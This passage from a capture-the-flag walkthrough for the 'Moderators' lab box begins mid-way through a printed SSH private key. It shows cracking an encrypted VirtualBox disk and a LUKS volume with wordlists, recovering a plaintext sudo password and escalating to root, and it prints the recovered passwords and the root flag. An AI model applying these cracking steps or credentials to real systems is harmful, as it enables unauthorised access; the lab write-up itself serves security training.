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
+-----END OPENSSH PRIVATE KEY-----
+</span> </code></pre></div></div>
+
+            <p class="head-img">Once in, we can find a VBOX directory with some virtual box files, in order to run the box we need to change some things in the <a href="https://pastebin.com/JK8FCxEy" rel="noreferrer noopener" target="_blank">vbox</a> file</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">john@moderators:~/stuff/VBOX$</span> ls
+2019-08-01.vbox  2019.vdi
+<span class="k">john@moderators:~/stuff/VBOX$</span>
+</span> </code></pre></div></div>
+
+
+            <p class="head-img">The vdi file is encrypted, but we can use <a href="https://github.com/axcheron/pyvboxdie-cracker" rel="noreferrer noopener" target="_blank">pyvboxdie-cracker</a></p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">python3 </span> pyvboxdie-cracker.py -v 2019-08-01.vbox -d /usr/share/wordlists/rockyou.txt
+Starting pyvboxdie-cracker...
+
+[*] Encrypted drive found :  F:/2019.vdi
+[*] KeyStore information...
+ Algorithm = AES-XTS256-PLAIN64
+ Hash = PBKDF2-SHA256
+ Final Hash = 5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f
+
+[*] Starting bruteforce...
+ 51 password tested...
+
+[*] Password Found = <span class="gd">computer</span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">To continue we need install the virtual box extension pack</p>
+            <img class="img-post" style="max-width: 598px;" src="/images/HTB/moderators/vbox_ext.png"></img>
+
+            <p class="head-img">Once ubuntu is installed we add the vdi image and enable the encription</p>
+            <img class="img-post" style="max-width: 505px;" src="/images/HTB/moderators/vdi_add.png"></img>
+
+            <p class="head-img">When we try to mount it we get a crypto_LUKS error, but we can use <a href="https://github.com/Diverto/cryptsetup-pwguess/releases" rel="noreferrer noopener" target="_blank">cryptsetup-pwguess</a> to get the password</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">ubuntu@ubuntu:~$</span> sudo mount /dev/sda /dev/shm
+mount: /dev/shm: unknown filesystem type 'crypto_LUKS'
+
+<span class="k">ubuntu@ubuntu:~$</span> ./bruteforce-luks-static-linux-amd64 -f wordlist.txt /dev/sda
+Password found: <span class="gd">abc123</span>
+<span class="k">ubuntu@ubuntu:~$</span>
+</span> </code></pre></div></div>
+
+
+            <p class="head-img">After mount it and digging for a while, we can find the password for john in scripts/all-in-one/distro_update.sh</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="kt">passwd='<span class="gd">$_THE_best_Sysadmin_Ever_</span>'</span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">Once we logged in as john we can see that we can run anything as root</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">john@moderators:~$</span> sudo -l
+[sudo] password for john: <span class="kt">$_THE_best_Sysadmin_Ever_</span>
+Matching Defaults entries for john on moderators:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/bin\:/bin
+
+User john may run the following commands on moderators:
+    (root) ALL
+<span class="k">john@moderators:~$</span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">We only have to do 'sudo su' and that's it</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">john@moderators:~$</span> sudo su
+<span class="k">john@moderators:~$</span> id
+uid=0(root) gid=0(root) groups=0(root)
+<span class="k">john@moderators:~$</span> cat /root/root.txt
+1765cd96cb0733204704e71f84db792d
+</span> </code></pre></div></div>
+
+<a href="#">Go back</a>
+		</article>
+      </main>
+  </body>
+</div>
+</html>
